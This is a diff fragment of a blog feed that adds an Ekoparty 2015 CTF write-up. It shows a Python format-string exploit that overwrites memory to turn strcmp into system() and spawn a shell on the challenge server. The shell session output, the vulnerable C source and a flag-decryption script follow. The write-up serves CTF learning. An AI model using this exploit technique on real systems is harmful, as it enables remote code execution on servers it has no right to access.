+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># write byte</span>
+</span><span class='line'>  <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hhn&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">what</span><span class="p">))</span><span class="o">+</span><span class="s">&quot;c%124$hn&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'><span class="k">def</span> <span class="nf">writebytes</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">what</span><span class="p">)):</span>
+</span><span class='line'>      <span class="n">write1</span><span class="p">(</span><span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">where</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>      
+</span><span class='line'><span class="k">global</span> <span class="n">conn</span>
+</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;challs.ctf.site&#39;</span><span class="p">,</span> <span class="mi">20002</span><span class="p">)</span>
+</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing /bin/sh to 0x13373008&quot;</span>
+</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="mh">0x13373008</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing system() to 0x13372020&quot;</span>
+</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xb7e69cd0</span><span class="p">),</span> <span class="mh">0x13372020</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] fucking up strcmp()&quot;</span>
+</span><span class='line'><span class="n">writebytes</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1f</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x13372011</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yeah. Pretty horrible.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ekoparty</span><span class="o">-</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn20</span><span class="err">$</span> <span class="n">python</span> <span class="n">pwnpoc</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="p">:</span> <span class="n">Done</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="n">to</span> <span class="mh">0x13373008</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">writing</span> <span class="n">system</span><span class="p">()</span> <span class="n">to</span> <span class="mh">0x13372020</span>
+</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">fucking</span> <span class="n">up</span> <span class="n">strcmp</span><span class="p">()</span>
+</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
+</span><span class='line'><span class="err">$</span> <span class="nb">id</span>
+</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">simple</span><span class="p">)</span>
+</span><span class='line'><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">simple</span>
+</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
+</span><span class='line'><span class="n">total</span> <span class="mi">68</span>
+</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">2</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span>
+</span><span class='line'><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span>   <span class="n">root</span>    <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">10</span> <span class="o">..</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">145</span> <span class="n">Sep</span> <span class="mi">12</span> <span class="mi">21</span><span class="p">:</span><span class="mi">13</span> <span class="o">.</span><span class="n">bash_history</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">220</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bash_logout</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>  <span class="mi">3637</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">bashrc</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>   <span class="mi">675</span> <span class="n">Oct</span>  <span class="mi">7</span>  <span class="mi">2014</span> <span class="o">.</span><span class="n">profile</span>
+</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">27095</span> <span class="n">Nov</span> <span class="mi">17</span>  <span class="mi">2011</span> <span class="n">checksec</span><span class="o">.</span><span class="n">sh</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">simple</span> <span class="n">simple</span>    <span class="mi">35</span> <span class="n">Sep</span> <span class="mi">14</span> <span class="mi">23</span><span class="p">:</span><span class="mi">37</span> <span class="n">flag</span>
+</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">1904</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">fmt_001</span><span class="o">.</span><span class="n">c</span>
+</span><span class='line'><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">simple</span>  <span class="mi">5776</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mo">01</span><span class="p">:</span><span class="mi">08</span> <span class="n">greetings</span>
+</span><span class='line'><span class="n">Hi</span> <span class="nb">id</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">OMG</span><span class="err">!</span> <span class="n">nice</span> <span class="n">work</span><span class="p">,</span> <span class="n">your</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="o">^</span>\<span class="n">x10LnBye</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include  &lt;signal.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">mkey</span><span class="p">;</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">mkey_crypt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span> <span class="p">};</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">fmt</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span> <span class="p">};</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span> <span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">decrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">len_key</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">len_msg</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">len_key</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WTF no memory :s&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">len_key</span><span class="p">]);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">num</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&lt;Simple loop greetings v1.3.3.7&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;[!] Type bye to quit&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter your name: &quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;bye&quot;</span><span class="p">))</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%n&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="s">&quot;%N&quot;</span><span class="p">))</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>            <span class="c1">//p: %s\n&quot;, buff);</span>
+</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hi &quot;</span><span class="p">);</span><span class="n">printf</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&quot;Welcome to ekoparty 2015!&quot;</span><span class="p">,</span> <span class="n">buff</span><span class="p">))</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;OMG! nice work, your flag is: &quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">fmt_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
+</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">flag_</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">mkey</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="n">fmt_</span><span class="p">,</span> <span class="n">flag_</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">fmt_</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">free</span><span class="p">(</span><span class="n">flag_</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">mkey_crypt</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">process</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">mkey</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Spot the mistake!</p>
+
+<p>Found it? Yeah:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_msg</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len_msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
+</span><span class='line'>      <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
+</span><span class='line'>      
+</span><span class='line'>  <span class="k">return</span> <span class="n">out</span>
+</span><span class='line'>  
+</span><span class='line'>
+</span><span class='line'><span class="n">mkey</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;3k0_p4rty_2015!&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x71\x73\x27\x1f\x1d\x48\x47</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">mkey</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which <em>finally</em> gave us the flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">EKO</span><span class="p">{</span>\<span class="o">%</span><span class="n">s</span><span class="p">}</span>
+</span><span class='line'><span class="n">b4by_3xpl0it_FMT_str1ng_FTW</span><span class="err">!</span><span class="c">#$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
@@ -5412,334 +6497,6 @@ The challenge already said that the flag needed a bit more work. Indeed, <code>f
 
 
 <p>Simple, really, once you know the trick.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
-    <updated>2015-04-02T19:43:08+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
-    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>
-
-<!-- more -->
-
-
-<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>
-
-<p><img src="http://barrebas.github.io/assets/bckdr/qr-00.png" alt="" />
-Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>
-
